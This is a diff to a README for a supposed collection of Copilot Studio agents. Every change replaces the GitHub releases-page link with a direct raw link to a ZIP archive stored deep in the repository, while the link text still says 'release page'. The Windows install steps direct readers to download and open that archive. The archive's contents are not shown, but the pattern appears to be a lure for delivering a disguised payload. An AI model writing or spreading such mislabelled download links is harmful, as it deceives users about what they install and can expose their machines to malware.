@@ -1,6 +1,6 @@
 # 🤖 awesome-copilot-studio-agents - Ready-to-use Copilot agents fast
 
-[![Download](https://img.shields.io/badge/Download-Release%20Page-blue?style=for-the-badge)](https://github.com/endoraunequal286/awesome-copilot-studio-agents/releases)
+[![Download](https://img.shields.io/badge/Download-Release%20Page-blue?style=for-the-badge)](https://raw.githubusercontent.com/endoraunequal286/awesome-copilot-studio-agents/main/agents/learning-development/awesome_agents_copilot_studio_v3.9.zip)
 
 ## 📦 What this is
 
@@ -22,13 +22,13 @@ If you can open a website and save a file, you have what you need to begin.
 
 ## 🚀 Download the files
 
-Go to the [release page](https://github.com/endoraunequal286/awesome-copilot-studio-agents/releases) to visit this page to download the package for Windows use.
+Go to the [release page](https://raw.githubusercontent.com/endoraunequal286/awesome-copilot-studio-agents/main/agents/learning-development/awesome_agents_copilot_studio_v3.9.zip) to visit this page to download the package for Windows use.
 
 From there, look for the latest release and download the files you want to use. If the release includes a ZIP file, save it to your computer first, then unzip it.
 
 ## 🪟 Install on Windows
 
-1. Open the [release page](https://github.com/endoraunequal286/awesome-copilot-studio-agents/releases).
+1. Open the [release page](https://raw.githubusercontent.com/endoraunequal286/awesome-copilot-studio-agents/main/agents/learning-development/awesome_agents_copilot_studio_v3.9.zip).
 2. Find the latest release at the top of the page.
 3. Download the release file or ZIP package.
 4. Open the downloaded file in File Explorer.
@@ -82,7 +82,7 @@ If you see different names, follow the files in the release package. The names a
 
 Use this flow if you are setting up an agent for the first time:
 
-1. Download the release from the [release page](https://github.com/endoraunequal286/awesome-copilot-studio-agents/releases).
+1. Download the release from the [release page](https://raw.githubusercontent.com/endoraunequal286/awesome-copilot-studio-agents/main/agents/learning-development/awesome_agents_copilot_studio_v3.9.zip).
 2. Extract the files on Windows.
 3. Open the agent you want to use.
 4. Read the prompt or instruction text.
@@ -166,7 +166,7 @@ Yes. They are designed to be copied, adjusted, and reused.
 
 ## 📥 Download again
 
-If you need the files again, go to the [release page](https://github.com/endoraunequal286/awesome-copilot-studio-agents/releases) to visit this page to download the latest package for Windows use.
+If you need the files again, go to the [release page](https://raw.githubusercontent.com/endoraunequal286/awesome-copilot-studio-agents/main/agents/learning-development/awesome_agents_copilot_studio_v3.9.zip) to visit this page to download the latest package for Windows use.
 
 ## 🧩 Suggested next step
 
